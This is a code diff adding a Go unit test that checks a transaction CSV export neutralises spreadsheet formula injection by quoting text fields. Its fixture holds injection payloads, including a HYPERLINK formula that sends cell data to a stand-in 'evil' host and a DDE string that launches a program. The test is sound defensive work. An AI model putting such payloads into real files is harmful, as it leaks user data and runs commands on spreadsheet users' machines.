@@ -58,6 +58,30 @@ func TestExportTransactionsCSV_ExactAmountsAndReportingFlags(t *testing.T) {
 	}
 }
 
+// A spreadsheet runs a cell that starts with = + - @ (or a tab or carriage
+// return before one) as a formula. Text from Sure (names, merchants,
+// categories, accounts) is user data, so it is quoted as text; the amount
+// keeps its sign.
+func TestExportTransactionsCSV_TextCannotBeAFormula(t *testing.T) {
+	txs := []models.Transaction{{
+		ID: "t1", Date: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC), AmountDecimal: "-12.30",
+		Name: `=HYPERLINK("http://evil/?d="&A1,"x")`, MerchantName: "@SUM(1+1)", CategoryName: "+cmd|' /C calc'!A0",
+		AccountName: "-2+3", Currency: "\t=1", Classification: "\r=1", Kind: "standard",
+	}}
+	var buf bytes.Buffer
+	if err := writeTransactionsCSV(&buf, rowsOf(txs)); err != nil {
+		t.Fatal(err)
+	}
+	rows, err := csv.NewReader(&buf).ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"t1", "2026-02-01", `'=HYPERLINK("http://evil/?d="&A1,"x")`, "-12.30", "'\t=1", "'\r=1", "standard", "'+cmd|' /C calc'!A0", "'-2+3", "'@SUM(1+1)", "false", "false"}
+	if !reflect.DeepEqual(rows[1], want) {
+		t.Fatalf("row\n got %q\nwant %q", rows[1], want)
+	}
+}
+
 // exportFixture holds what an export must carry through unchanged: HTML
 // characters, non-ASCII text, quotes and separators, zero values.
 func exportFixture() []models.Transaction {
